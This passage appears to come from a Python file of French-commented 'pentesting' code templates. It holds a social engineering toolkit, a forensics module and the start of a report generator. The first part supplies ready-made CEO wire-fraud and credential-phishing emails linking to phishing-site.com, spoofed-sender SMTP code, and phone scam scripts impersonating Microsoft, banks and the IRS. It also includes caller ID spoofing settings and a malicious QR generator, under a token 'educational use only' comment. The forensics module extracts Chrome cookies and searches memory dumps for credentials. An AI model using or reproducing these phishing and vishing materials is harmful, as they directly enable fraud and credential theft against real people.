            'twitter': None,
            'emails': [],
            'interests': []
        }
        
        # Recherche LinkedIn (simulation)
        linkedin_url = f"https://www.linkedin.com/search/results/people/?keywords={target_name}%20{company}"
        print(f"[*] LinkedIn: {linkedin_url}")
        
        # Recherche Twitter
        twitter_url = f"https://twitter.com/search?q={target_name}%20{company}"
        print(f"[*] Twitter: {twitter_url}")
        
        # Formats d'emails courants
        name_parts = target_name.lower().split()
        if len(name_parts) >= 2:
            first, last = name_parts[0], name_parts[-1]
            company_domain = company.lower().replace(' ', '') + '.com'
            
            info['emails'] = [
                f"{first}.{last}@{company_domain}",
                f"{first}{last}@{company_domain}",
                f"{first[0]}{last}@{company_domain}",
                f"{last}@{company_domain}"
            ]
        
        return info
    
    @staticmethod
    def create_personalized_email(target_info: Dict, pretext: str) -> str:
        '''Créer un email personnalisé'''
        name = target_info['name']
        company = target_info['company']
        
        pretexts = {{
            'ceo_fraud': f'''
            <html>
              <body>
                <p>Hi {{name}},</p>
                <p>I need you to process an urgent wire transfer.</p>
                <p>Please send $50,000 to the following account by EOD:</p>
                <p>Account: 1234567890<br>
                   Routing: 987654321<br>
                   Bank: First National Bank</p>
                <p>This is time-sensitive. Let me know when it's done.</p>
                <p>Thanks,<br>CEO</p>
              </body>
            </html>
            ''',
            
            'hr_benefits': f'''
            <html>
              <body>
                <p>Dear {{name}},</p>
                <p>As part of our annual benefits review, we need you to update
                   your information in our HR system.</p>
                <p>Please click the link below to verify your details:</p>
                <a href="http://phishing-site.com/hr">Update Benefits Information</a>
                <p>This must be completed by Friday to avoid losing coverage.</p>
                <p>Best regards,<br>{{company}} HR Department</p>
              </body>
            </html>
            ''',
            
            'it_support': f'''
            <html>
              <body>
                <p>Hi {{name}},</p>
                <p>We're performing mandatory security updates on all {{company}} accounts.</p>
                <p>Please verify your credentials to avoid account suspension:</p>
                <a href="http://phishing-site.com/verify">Verify Account</a>
                <p>This must be completed within 2 hours.</p>
                <p>Thanks,<br>IT Support Team</p>
              </body>
            </html>
            '''
        }}
        
        return pretexts.get(pretext, pretexts['it_support'])

# ========================================
# EMAIL SPOOFING
# ========================================

class EmailSpoofing:
    '''Techniques de spoofing d'emails'''
    
    @staticmethod
    def check_spf_record(domain: str) -> Dict:
        '''Vérifier les enregistrements SPF'''
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            spf_records = [str(rdata) for rdata in answers if 'spf' in str(rdata).lower()]
            
            return {
                'domain': domain,
                'has_spf': len(spf_records) > 0,
                'records': spf_records
            }
        except Exception as e:
            return {'domain': domain, 'has_spf': False, 'error': str(e)}
    
    @staticmethod
    def check_dmarc_record(domain: str) -> Dict:
        '''Vérifier les enregistrements DMARC'''
        try:
            dmarc_domain = f"_dmarc.{domain}"
            answers = dns.resolver.resolve(dmarc_domain, 'TXT')
            dmarc_records = [str(rdata) for rdata in answers]
            
            return {
                'domain': domain,
                'has_dmarc': len(dmarc_records) > 0,
                'records': dmarc_records
            }
        except Exception as e:
            return {'domain': domain, 'has_dmarc': False, 'error': str(e)}
    
    @staticmethod
    def send_spoofed_email(smtp_server: str, from_addr: str, to_addr: str,
                          subject: str, body: str) -> bool:
        '''Envoyer un email avec adresse falsifiée'''
        msg = MIMEMultipart()
        msg['From'] = from_addr  # Adresse falsifiée
        msg['To'] = to_addr
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'html'))
        
        try:
            # Connexion sans authentification (relay ouvert)
            with smtplib.SMTP(smtp_server, 25) as server:
                server.sendmail(from_addr, to_addr, msg.as_string())
            
            print(f"[+] Spoofed email sent from {from_addr} to {to_addr}")
            return True
        
        except Exception as e:
            print(f"[!] Failed: {e}")
            return False

# ========================================
# VISHING (VOICE PHISHING)
# ========================================

class VishingFramework:
    '''Framework pour attaques par téléphone'''
    
    @staticmethod
    def generate_script(scenario: str) -> str:
        '''Générer un script de vishing'''
        scripts = {
            'tech_support': (
                "TECH SUPPORT SCAM SCRIPT:\n\n"
                "1. Introduction:\n"
                '   "Hello, this is [Name] from Microsoft Technical Support.\n'
                '    We\'ve detected malware on your computer."\n\n'
                "2. Create Urgency:\n"
                '   "Your computer is infected and transmitting your personal data.\n'
                '    We need to fix this immediately."\n\n'
                "3. Request Access:\n"
                '   "I need you to go to your computer and download our remote\n'
                '    access tool so I can clean the infection."\n\n'
                "4. Get Information:\n"
                '   "While I\'m fixing this, I\'ll need your Windows license key\n'
                '    and credit card for the annual protection plan."'
            ),
            
            'bank_fraud': (
                "BANK FRAUD SCRIPT:\n\n"
                "1. Introduction:\n"
                '   "This is [Bank Name] fraud department. We\'ve detected\n'
                '    suspicious activity on your account."\n\n'
                "2. Verify Identity:\n"
                '   "For security purposes, I need to verify your identity.\n'
                '    Can you confirm your full name and date of birth?"\n\n'
                "3. Create Fear:\n"
                '   "Someone attempted to withdraw $5,000 from your account.\n'
                '    We\'ve temporarily frozen it for your protection."\n\n'
                "4. Get Credentials:\n"
                '   "To unlock your account, I need you to verify your\n'
                '    account number and PIN."'
            ),
            
            'irs_scam': (
                "IRS SCAM SCRIPT:\n\n"
                "1. Intimidation:\n"
                '   "This is Officer [Name] from the IRS. You have unpaid\n'
                '    taxes and a warrant has been issued for your arrest."\n\n'
                "2. Urgency:\n"
                '   "You need to pay immediately to avoid arrest. Police\n'
                '    are on their way to your location."\n\n'
                "3. Payment Demand:\n"
                '   "You can resolve this now by purchasing iTunes gift cards\n'
                '    or sending a wire transfer."\n\n'
                "4. Threat:\n"
                '   "If payment isn\'t received in 1 hour, you will be arrested\n'
                '    and your assets frozen."'
            )
        }
        
        return scripts.get(scenario, "No script available")
    
    @staticmethod
    def caller_id_spoofing_guide() -> str:
        '''Guide pour falsifier l\'ID de l\'appelant'''
        return (
            "CALLER ID SPOOFING METHODS:\n\n"
            "1. VoIP Services:\n"
            "   - Use SpoofCard or similar services\n"
            "   - Configure Asterisk/FreePBX with custom caller ID\n"
            "   - Use Twilio API with custom 'From' number\n\n"
            "2. SIP Configuration:\n"
            '   From: "Microsoft Support" <sip:1-800-642-7676@voip.com>\n'
            '   Remote-Party-ID: "1-800-642-7676" <sip:1-800-642-7676@voip.com>\n\n'
            "3. Asterisk Configuration:\n"
            "   [trunk-outgoing]\n"
            "   type=friend\n"
            "   host=your-voip-provider.com\n"
            "   fromdomain=spoofed-number.com\n"
            "   fromuser=18006427676"
        )

# ========================================
# QR CODE PHISHING
# ========================================

class QRCodePhishing:
    '''Génération de QR codes malveillants'''
    
    @staticmethod
    def generate_malicious_qr(phishing_url: str, output_path: str = None) -> bytes:
        '''Générer un QR code vers un site de phishing'''
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        
        qr.add_data(phishing_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        if output_path:
            img.save(output_path)
            print(f"[+] QR code saved to {output_path}")
        
        # Retourner en base64
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        img_bytes = buffer.getvalue()
        
        return base64.b64encode(img_bytes)
    
    @staticmethod
    def create_fake_wifi_qr(ssid: str, password: str = None) -> bytes:
        '''Créer un faux QR code WiFi'''
        if password:
            wifi_config = f"WIFI:T:WPA;S:{ssid};P:{password};;"
        else:
            wifi_config = f"WIFI:T:nopass;S:{ssid};;"
        
        qr = qrcode.make(wifi_config)
        
        buffer = BytesIO()
        qr.save(buffer, format='PNG')
        return buffer.getvalue()

# ========================================
# SCRIPT D'EXÉCUTION
# ========================================

def social_engineering_campaign():
    '''Campagne complète de social engineering'''
    print(f"\\n{'='*60}")
    print(f"SOCIAL ENGINEERING CAMPAIGN")
    print(f"{'='*60}\\n")
    
    # Configuration
    targets = ['target1@company.com', 'target2@company.com']
    company = "Target Company"
    
    # 1. OSINT
    print("[*] PHASE 1: OSINT GATHERING")
    for target_email in targets:
        target_name = target_email.split('@')[0].replace('.', ' ').title()
        info = SpearPhishing.gather_osint(target_name, company)
        print(f"[+] Gathered info for {target_name}")
    
    # 2. Vérifier les protections email
    print("\\n[*] PHASE 2: EMAIL SECURITY CHECKS")
    domain = targets[0].split('@')[1]
    spf = EmailSpoofing.check_spf_record(domain)
    dmarc = EmailSpoofing.check_dmarc_record(domain)
    print(f"[+] SPF: {spf['has_spf']}")
    print(f"[+] DMARC: {dmarc['has_dmarc']}")
    
    # 3. Générer QR codes
    print("\\n[*] PHASE 3: GENERATING MALICIOUS QR CODES")
    qr_data = QRCodePhishing.generate_malicious_qr(
        'http://phishing-site.com/fake-portal',
        'malicious_qr.png'
    )
    
    # 4. Préparer scripts de vishing
    print("\\n[*] PHASE 4: VISHING SCRIPTS")
    script = VishingFramework.generate_script('tech_support')
    print("[+] Tech support script generated")
    
    print(f"\\n[+] Campaign prepared!")

if __name__ == "__main__":
    # ATTENTION: Usage éducatif uniquement!
    social_engineering_campaign()
"""
    },

    # ========================================
    # PENTESTING - DIGITAL FORENSICS
    # ========================================
    
    "pentest_digital_forensics": {
        "patterns": ["digital forensics", "memory forensics", "disk forensics", "log analysis", "incident response", "artifact recovery"],
        "template": """
# ========================================
# PENTESTING - DIGITAL FORENSICS
# ========================================

import hashlib
import os
import json
import re
from datetime import datetime
from typing import List, Dict, Any
import sqlite3
import struct

# ========================================
# MEMORY FORENSICS
# ========================================

class MemoryForensics:
    '''Analyse de dumps mémoire'''
    
    def __init__(self, dump_path: str):
        self.dump_path = dump_path
        self.findings = []
    
    def extract_strings(self, min_length: int = 8) -> List[str]:
        '''Extraire les chaînes de caractères'''
        print(f"[*] Extracting strings from {self.dump_path}")
        
        strings = []
        current_string = ""
        
        try:
            with open(self.dump_path, 'rb') as f:
                while True:
                    byte = f.read(1)
                    if not byte:
                        break
                    
                    char = byte.decode('ascii', errors='ignore')
                    if char.isprintable():
                        current_string += char
                    else:
                        if len(current_string) >= min_length:
                            strings.append(current_string)
                        current_string = ""
        
        except Exception as e:
            print(f"[!] Error: {e}")
        
        print(f"[+] Found {len(strings)} strings")
        return strings
    
    def find_credentials(self, strings: List[str] = None) -> List[Dict]:
        '''Rechercher des credentials en mémoire'''
        if strings is None:
            strings = self.extract_strings()
        
        print("[*] Searching for credentials...")
        
        credentials = []
        patterns = {
            'password': r'password[\\s:=]+([\\w!@#$%^&*]+)',
            'api_key': r'api[_-]?key[\\s:=]+([a-zA-Z0-9]{20,})',
            'token': r'token[\\s:=]+([a-zA-Z0-9._-]+)',
            'secret': r'secret[\\s:=]+([\\w!@#$%^&*]+)',
            'username': r'user(?:name)?[\\s:=]+(\\w+)'
        }
        
        for string in strings:
            for cred_type, pattern in patterns.items():
                matches = re.findall(pattern, string, re.IGNORECASE)
                for match in matches:
                    credentials.append({
                        'type': cred_type,
                        'value': match,
                        'context': string[:100]
                    })
        
        print(f"[+] Found {len(credentials)} potential credentials")
        return credentials
    
    def find_ip_addresses(self, strings: List[str] = None) -> List[str]:
        '''Extraire les adresses IP'''
        if strings is None:
            strings = self.extract_strings()
        
        ip_pattern = r'\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b'
        ips = []
        
        for string in strings:
            matches = re.findall(ip_pattern, string)
            ips.extend(matches)
        
        unique_ips = list(set(ips))
        print(f"[+] Found {len(unique_ips)} unique IP addresses")
        return unique_ips
    
    def find_urls(self, strings: List[str] = None) -> List[str]:
        '''Extraire les URLs'''
        if strings is None:
            strings = self.extract_strings()
        
        url_pattern = r'https?://[\\w\\-._~:/?#\\[\\]@!$&\'()*+,;=]+'
        urls = []
        
        for string in strings:
            matches = re.findall(url_pattern, string)
            urls.extend(matches)
        
        unique_urls = list(set(urls))
        print(f"[+] Found {len(unique_urls)} unique URLs")
        return unique_urls
    
    def volatility_commands(self) -> Dict[str, str]:
        '''Commandes Volatility courantes'''
        return {
            'imageinfo': f'volatility -f {self.dump_path} imageinfo',
            'pslist': f'volatility -f {self.dump_path} --profile=PROFILE pslist',
            'pstree': f'volatility -f {self.dump_path} --profile=PROFILE pstree',
            'netscan': f'volatility -f {self.dump_path} --profile=PROFILE netscan',
            'cmdline': f'volatility -f {self.dump_path} --profile=PROFILE cmdline',
            'filescan': f'volatility -f {self.dump_path} --profile=PROFILE filescan',
            'malfind': f'volatility -f {self.dump_path} --profile=PROFILE malfind',
            'dlllist': f'volatility -f {self.dump_path} --profile=PROFILE dlllist',
            'hashdump': f'volatility -f {self.dump_path} --profile=PROFILE hashdump',
            'hivelist': f'volatility -f {self.dump_path} --profile=PROFILE hivelist'
        }

# ========================================
# DISK FORENSICS
# ========================================

class DiskForensics:
    '''Analyse forensique de disque'''
    
    def __init__(self, image_path: str):
        self.image_path = image_path
    
    def calculate_hash(self, algorithm: str = 'sha256') -> str:
        '''Calculer le hash du disque'''
        print(f"[*] Calculating {algorithm} hash of {self.image_path}")
        
        hash_obj = hashlib.new(algorithm)
        
        try:
            with open(self.image_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    hash_obj.update(chunk)
            
            digest = hash_obj.hexdigest()
            print(f"[+] {algorithm.upper()}: {digest}")
            return digest
        
        except Exception as e:
            print(f"[!] Error: {e}")
            return ""
    
    def find_deleted_files(self) -> List[Dict]:
        '''Rechercher des fichiers supprimés'''
        print("[*] Searching for deleted files...")
        
        # Cette fonction utiliserait normalement pytsk3 ou sleuthkit
        deleted_files = []
        
        # Simulation de résultats
        print("[+] Found deleted files (use photorec/scalpel for actual recovery)")
        return deleted_files
    
    def extract_file_metadata(self, file_path: str) -> Dict:
        '''Extraire les métadonnées d'un fichier'''
        try:
            stat = os.stat(file_path)
            
            metadata = {
                'path': file_path,
                'size': stat.st_size,
                'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'accessed': datetime.fromtimestamp(stat.st_atime).isoformat(),
                'md5': self._file_hash(file_path, 'md5'),
                'sha256': self._file_hash(file_path, 'sha256')
            }
            
            return metadata
        
        except Exception as e:
            print(f"[!] Error: {e}")
            return {}
    
    def _file_hash(self, file_path: str, algorithm: str) -> str:
        '''Calculer le hash d'un fichier'''
        hash_obj = hashlib.new(algorithm)
        
        try:
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    hash_obj.update(chunk)
            return hash_obj.hexdigest()
        except:
            return ""
    
    def carve_files(self, output_dir: str, file_types: List[str] = None):
        '''Carving de fichiers'''
        if file_types is None:
            file_types = ['jpg', 'png', 'pdf', 'docx', 'zip']
        
        print(f"[*] Carving files: {', '.join(file_types)}")
        
        file_signatures = {
            'jpg': b'\\xff\\xd8\\xff',
            'png': b'\\x89PNG\\r\\n\\x1a\\n',
            'pdf': b'%PDF',
            'zip': b'PK\\x03\\x04',
            'exe': b'MZ'
        }
        
        print(f"[*] Output directory: {output_dir}")
        print("[+] Use photorec or scalpel for actual file carving")

# ========================================
# LOG ANALYSIS
# ========================================

class LogAnalysis:
    '''Analyse de logs système'''
    
    def __init__(self, log_path: str):
        self.log_path = log_path
        self.events = []
    
    def parse_linux_auth_log(self) -> List[Dict]:
        '''Parser les logs d'authentification Linux'''
        print(f"[*] Parsing {self.log_path}")
        
        events = []
        
        patterns = {
            'ssh_success': r'Accepted (\\w+) for (\\w+) from ([\\d.]+) port (\\d+)',
            'ssh_failed': r'Failed (\\w+) for (\\w+) from ([\\d.]+) port (\\d+)',
            'sudo_command': r'(\\w+) : TTY=(\\w+) ; PWD=([^;]+) ; USER=(\\w+) ; COMMAND=(.*)',
            'user_add': r'new user: name=(\\w+), UID=(\\d+), GID=(\\d+)',
            'user_delete': r'delete user \'(\\w+)\''
        }
        
        try:
            with open(self.log_path, 'r') as f:
                for line in f:
                    for event_type, pattern in patterns.items():
                        match = re.search(pattern, line)
                        if match:
                            events.append({
                                'type': event_type,
                                'timestamp': self._extract_timestamp(line),
                                'details': match.groups(),
                                'raw': line.strip()
                            })
        
        except Exception as e:
            print(f"[!] Error: {e}")
        
        print(f"[+] Found {len(events)} security events")
        return events
    
    def parse_windows_event_log(self, event_ids: List[int] = None) -> List[Dict]:
        '''Parser les logs d'événements Windows'''
        if event_ids is None:
            event_ids = [4624, 4625, 4672, 4720, 4732]  # Logon, Failed logon, Admin logon, User created, Group member added
        
        print(f"[*] Parsing Windows Event Log for IDs: {event_ids}")
        
        # Cette fonction utiliserait python-evtx pour parser les vrais logs
        events = []
        
        print("[+] Use python-evtx for actual Windows event log parsing")
        return events
    
    def _extract_timestamp(self, log_line: str) -> str:
        '''Extraire le timestamp d'une ligne de log'''
        # Format: Month Day HH:MM:SS
        timestamp_pattern = r'(\\w{3}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2})'
        match = re.search(timestamp_pattern, log_line)
        
        if match:
            return match.group(1)
        return ""
    
    def find_suspicious_activity(self, events: List[Dict]) -> List[Dict]:
        '''Détecter les activités suspectes'''
        print("[*] Analyzing for suspicious activity...")
        
        suspicious = []
        
        # Brute force detection (multiple failed logins)
        failed_logins = {}
        for event in events:
            if event['type'] == 'ssh_failed':
                ip = event['details'][2] if len(event['details']) > 2 else 'unknown'
                failed_logins[ip] = failed_logins.get(ip, 0) + 1
        
        for ip, count in failed_logins.items():
            if count >= 5:
                suspicious.append({
                    'type': 'brute_force_attempt',
                    'ip': ip,
                    'failed_attempts': count
                })
        
        # Privilege escalation
        for event in events:
            if event['type'] == 'sudo_command':
                suspicious.append({
                    'type': 'privilege_escalation',
                    'user': event['details'][0] if event['details'] else 'unknown',
                    'command': event['details'][4] if len(event['details']) > 4 else 'unknown'
                })
        
        print(f"[+] Found {len(suspicious)} suspicious activities")
        return suspicious
    
    def generate_timeline(self, events: List[Dict], output_path: str):
        '''Générer une timeline des événements'''
        print(f"[*] Generating timeline to {output_path}")
        
        with open(output_path, 'w') as f:
            f.write("TIMELINE OF SECURITY EVENTS\\n")
            f.write("="*60 + "\\n\\n")
            
            for event in sorted(events, key=lambda x: x.get('timestamp', '')):
                f.write(f"[{event['timestamp']}] {event['type']}\\n")
                f.write(f"  Details: {event['details']}\\n")
                f.write(f"  Raw: {event['raw'][:100]}...\\n\\n")
        
        print(f"[+] Timeline saved to {output_path}")

# ========================================
# BROWSER FORENSICS
# ========================================

class BrowserForensics:
    '''Analyse forensique des navigateurs'''
    
    @staticmethod
    def extract_chrome_history(profile_path: str) -> List[Dict]:
        '''Extraire l'historique Chrome'''
        history_db = os.path.join(profile_path, 'History')
        
        if not os.path.exists(history_db):
            print(f"[!] Chrome history not found: {history_db}")
            return []
        
        print(f"[*] Extracting Chrome history from {history_db}")
        
        urls = []
        
        try:
            conn = sqlite3.connect(history_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                ORDER BY last_visit_time DESC
            ''')
            
            for row in cursor.fetchall():
                # Chrome stocke les timestamps en microsecondes depuis 1601-01-01
                timestamp = row[3] / 1000000 - 11644473600 if row[3] else 0
                
                urls.append({
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'last_visit': datetime.fromtimestamp(timestamp).isoformat() if timestamp > 0 else 'N/A'
                })
            
            conn.close()
            print(f"[+] Extracted {len(urls)} URLs")
        
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return urls
    
    @staticmethod
    def extract_chrome_cookies(profile_path: str) -> List[Dict]:
        '''Extraire les cookies Chrome'''
        cookies_db = os.path.join(profile_path, 'Cookies')
        
        if not os.path.exists(cookies_db):
            print(f"[!] Chrome cookies not found: {cookies_db}")
            return []
        
        print(f"[*] Extracting Chrome cookies from {cookies_db}")
        
        cookies = []
        
        try:
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT host_key, name, value, path, expires_utc, is_secure
                FROM cookies
            ''')
            
            for row in cursor.fetchall():
                cookies.append({
                    'domain': row[0],
                    'name': row[1],
                    'value': row[2],
                    'path': row[3],
                    'expires': row[4],
                    'secure': bool(row[5])
                })
            
            conn.close()
            print(f"[+] Extracted {len(cookies)} cookies")
        
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return cookies
    
    @staticmethod
    def extract_chrome_downloads(profile_path: str) -> List[Dict]:
        '''Extraire l'historique de téléchargements'''
        history_db = os.path.join(profile_path, 'History')
        
        if not os.path.exists(history_db):
            return []
        
        downloads = []
        
        try:
            conn = sqlite3.connect(history_db)
            cursor = conn.cursor()
            
            cursor.execute(''' 
                SELECT target_path, start_time, total_bytes, tab_url
                FROM downloads
                ORDER BY start_time DESC
            ''')
            
            for row in cursor.fetchall():
                downloads.append({
                    'file': row[0],
                    'start_time': row[1],
                    'size': row[2],
                    'source_url': row[3]
                })
            
            conn.close()
            print(f"[+] Extracted {len(downloads)} downloads")
        
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return downloads

# ========================================
# FORENSIC REPORT GENERATOR
# ========================================

class ForensicReportGenerator:
    '''Générateur de rapport forensique'''
    
    def __init__(self):
        self.findings = []
        self.timeline = []
    
    def add_finding(self, category: str, description: str, severity: str, evidence: Any):
        '''Ajouter une découverte'''
        self.findings.append({
            'timestamp': datetime.now().isoformat(),
            'category': category,
            'description': description,
            'severity': severity,
            'evidence': evidence
        })
    
    def generate_report(self, output_path: str):
        '''Générer le rapport complet'''
        print(f"[*] Generating forensic report: {output_path}")
        
        report = {
            'report_metadata': {
                'generated': datetime.now().isoformat(),
                'investigator': 'Digital Forensics Team',
                'case_number': 'CASE-2024-001'
            },
            'executive_summary': {
                'total_findings': len(self.findings),
                'critical': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
                'high': len([f for f in self.findings if f['severity'] == 'HIGH']),
                'medium': len([f for f in self.findings if f['severity'] == 'MEDIUM']),
                'low': len([f for f in self.findings if f['severity'] == 'LOW'])
            },
            'findings': self.findings,
            'timeline': sorted(self.timeline, key=lambda x: x['timestamp'])
        }
        
        with open(output_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to {output_path}")

# ========================================
# SCRIPT D'EXÉCUTION
# ========================================

def forensic_investigation(memory_dump: str, disk_image: str, log_path: str):
    '''Investigation forensique complète'''
    print(f"\\n{'='*60}")
    print(f"DIGITAL FORENSICS INVESTIGATION")
    print(f"{'='*60}\\n")
    
    report = ForensicReportGenerator()
    
    # 1. Memory Analysis
    print("[*] PHASE 1: MEMORY FORENSICS")
    mem = MemoryForensics(memory_dump)
    strings = mem.extract_strings()
    credentials = mem.find_credentials(strings)
    ips = mem.find_ip_addresses(strings)
    
    report.add_finding(
        'Memory Analysis',
        f'Found {len(credentials)} potential credentials',
        'HIGH',
        credentials[:5]
    )
    
    # 2. Disk Analysis
    print("\\n[*] PHASE 2: DISK FORENSICS")
    disk = DiskForensics(disk_image)
    disk_hash = disk.calculate_hash()
    
    report.add_finding(
        'Disk Integrity',
        f'Disk image hash: {disk_hash}',
        'INFO',
        {'sha256': disk_hash}
    )
    
    # 3. Log Analysis
    print("\\n[*] PHASE 3: LOG ANALYSIS")
    logs = LogAnalysis(log_path)
    events = logs.parse_linux_auth_log()
    suspicious = logs.find_suspicious_activity(events)
    
    for activity in suspicious:
        report.add_finding(
            'Suspicious Activity',
            f"{activity['type']}: {activity}",
            'CRITICAL',
            activity
        )
    
    # Generate Report
    report.generate_report('forensic_report.json')
    print(f"\\n[+] Investigation complete!")

if __name__ == "__main__":
    forensic_investigation(
        memory_dump='memory.dmp',
        disk_image='disk.img',
        log_path='/var/log/auth.log'
    )
"""
    },

    # ========================================
    # PENTESTING - REPORT GENERATION
    # ========================================
    
    "pentest_report_generation": {
        "patterns": ["pentest report", "vulnerability report", "penetration testing report", "security assessment report"],
        "template": """
# ========================================
# PENTESTING - PROFESSIONAL REPORT GENERATION
# ========================================

from typing import List, Dict, Any
from datetime import datetime
import json
from collections import Counter
import matplotlib.pyplot as plt
import io
import base64

# ========================================
# FINDING DATABASE
# ========================================

class Finding:
    '''Représentation d'une vulnérabilité'''
    
    SEVERITY_LEVELS = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
    CVSS_RANGES = {
        'CRITICAL': (9.0, 10.0),
        'HIGH': (7.0, 8.9),
        'MEDIUM': (4.0, 6.9),
        'LOW': (0.1, 3.9),
        'INFO': (0.0, 0.0)
    }
    
    def __init__(self, title: str, severity: str, cvss_score: float = 0.0):
        self.id = self._generate_id()
        self.title = title
        self.severity = severity.upper()
        self.cvss_score = cvss_score
        self.description = ""
        self.impact = ""
        self.affected_systems = []
        self.evidence = []
        self.remediation = ""
        self.references = []
        self.discovered_date = datetime.now()
        self.status = "Open"
    
    def _generate_id(self) -> str:
        '''Générer un ID unique'''
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        return f"VULN-{timestamp}"
    
    def to_dict(self) -> Dict:
        '''Convertir en dictionnaire'''
        return {
            'id': self.id,
            'title': self.title,
            'severity': self.severity,
            'cvss_score': self.cvss_score,
            'description': self.description,
            'impact': self.impact,
            'affected_systems': self.affected_systems,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'references': self.references,
            'discovered_date': self.discovered_date.isoformat(),
            'status': self.status
        }

class FindingsDatabase:
    '''Base de données des vulnérabilités'''
    
    def __init__(self):
        self.findings: List[Finding] = []
    
    def add_finding(self, finding: Finding):
        '''Ajouter une vulnérabilité'''
        self.findings.append(finding)
    
    def get_by_severity(self, severity: str) -> List[Finding]:
        '''Obtenir les vulnérabilités par sévérité'''
        return [f for f in self.findings if f.severity == severity.upper()]
    
    def get_statistics(self) -> Dict:
        '''Obtenir des statistiques'''
        severity_counts = Counter(f.severity for f in self.findings)
        
        return {
            'total': len(self.findings),
            'by_severity': dict(severity_counts),
            'critical': severity_counts.get('CRITICAL', 0),
            'high': severity_counts.get('HIGH', 0),
            'medium': severity_counts.get('MEDIUM', 0),
            'low': severity_counts.get('LOW', 0),
            'info': severity_counts.get('INFO', 0),
            'average_cvss': sum(f.cvss_score for f in self.findings) / len(self.findings) if self.findings else 0
        }
    
    def export_json(self, filepath: str):
        '''Exporter en JSON'''
        data = {
            'export_date': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'findings': [f.to_dict() for f in self.findings]
        }
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"[+] Findings exported to {filepath}")

# ========================================
# REPORT TEMPLATES
# ========================================

class ReportGenerator:
    '''Générateur de rapports de pentesting'''
    
    def __init__(self, client_name: str, assessment_type: str):
        self.client_name = client_name
        self.assessment_type = assessment_type
        self.findings_db = FindingsDatabase()
        self.metadata = {
            'start_date': None,
            'end_date': None,
            'testers': [],
            'scope': [],
            'methodology': []
        }
    
    def generate_executive_summary(self) -> str:
        '''Générer le résumé exécutif'''
        stats = self.findings_db.get_statistics()
        
        summary = f\"\"\"
# EXECUTIVE SUMMARY

## Assessment Overview

{self.client_name} engaged our team to conduct a {self.assessment_type} assessment.
The assessment was performed from {self.metadata['start_date']} to {self.metadata['end_date']}.

## Key Findings

During this assessment, our team identified **{stats['total']} vulnerabilities**:

- **{stats['critical']} Critical** - Requiring immediate attention
- **{stats['high']} High** - Should be addressed urgently
- **{stats['medium']} Medium** - Should be remediated
- **{stats['low']} Low** - Can be addressed in regular maintenance
- **{stats['info']} Informational** - For awareness

## Risk Rating

Based on the findings, the overall security posture is rated as:
\"\"\"
        
        # Déterminer le risque global
        if stats['critical'] > 0:
            risk = "**CRITICAL** - Immediate action required"
        elif stats['high'] > 2:
            risk = "**HIGH** - Urgent remediation needed"
        elif stats['medium'] > 5:
            risk = "**MEDIUM** - Address in near term"
        else:
            risk = "**LOW** - Acceptable security posture"
        
        summary += f"\\n{risk}\\n"
        
        return summary
    
    def generate_technical_findings(self) -> str:
        '''Générer la section des découvertes techniques'''
        report = "# TECHNICAL FINDINGS\\n\\n"
        
        for severity in Finding.SEVERITY_LEVELS:
            findings = self.findings_db.get_by_severity(severity)
            
            if not findings:
                continue
            
            report += f"## {severity} Severity Findings\\n\\n"
            
            for finding in findings:
                report += f"### {finding.id} - {finding.title}\\n\\n"
                report += f"**Severity:** {finding.severity}\\n"
                report += f"**CVSS Score:** {finding.cvss_score}\\n"
                report += f"**Status:** {finding.status}\\n\\n"
                
                report += f"#### Description\\n{finding.description}\\n\\n"
                
                if finding.affected_systems:
                    report += f"#### Affected Systems\\n"
                    for system in finding.affected_systems:
                        report += f"- {system}\\n"
                    report += "\\n"
                
                report += f"#### Impact\\n{finding.impact}\\n\\n"
                
                if finding.evidence:
                    report += f"#### Evidence\\n"
                    for evidence in finding.evidence:
                        report += f"```\\n{evidence}\\n```\\n\\n"
                
                report += f"#### Remediation\\n{finding.remediation}\\n\\n"
                
                if finding.references:
                    report += f"#### References\\n"
                    for ref in finding.references:
                        report += f"- {ref}\\n"
                    report += "\\n"
                
                report += "---\\n\\n"
        
        return report
    
    def generate_methodology_section(self) -> str:
        '''Générer la section méthodologie'''
        return f\"\"\"
# METHODOLOGY

## Assessment Approach

This {self.assessment_type} was conducted following industry-standard methodologies:

### 1. Reconnaissance & Information Gathering
- Passive reconnaissance (OSINT)
- Active reconnaissance (port scanning, service enumeration)
- Web application fingerprinting

### 2. Vulnerability Analysis
- Automated vulnerability scanning
- Manual security testing
- Configuration review
- Source code analysis (if applicable)

### 3. Exploitation
- Proof-of-concept development
- Privilege escalation attempts
- Lateral movement testing
- Data exfiltration simulation

### 4. Post-Exploitation
- Persistence mechanisms
- Credential harvesting
- Internal reconnaissance

### 5. Reporting
- Finding documentation
- Risk assessment
- Remediation recommendations

## Tools Used

- **Reconnaissance:** Nmap, Masscan, DNSRecon, Shodan
- **Vulnerability Scanning:** Nessus, OpenVAS, Burp Suite Pro
- **Exploitation:** Metasploit, Custom scripts
- **Web Testing:** Burp Suite, OWASP ZAP, SQLMap
